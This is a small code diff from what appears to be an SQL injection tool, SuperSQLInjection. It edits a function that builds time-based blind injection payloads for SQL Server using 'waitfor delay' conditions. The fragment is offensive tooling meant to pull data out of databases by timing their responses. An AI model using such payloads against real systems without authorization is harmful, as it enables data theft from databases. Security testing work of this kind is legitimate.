@@ -92,7 +92,7 @@ namespace SuperSQLInjection.payload
 
         public static String getBoolDataBySleep(String data, int maxTime)
         {
-            return " 1=1 if(" + data + ") waitfor delay '0:0:" + maxTime + "'";
+            return " if(" + data + ") waitfor delay '0:0:" + maxTime + "'";
         }
 
         /// <summary>
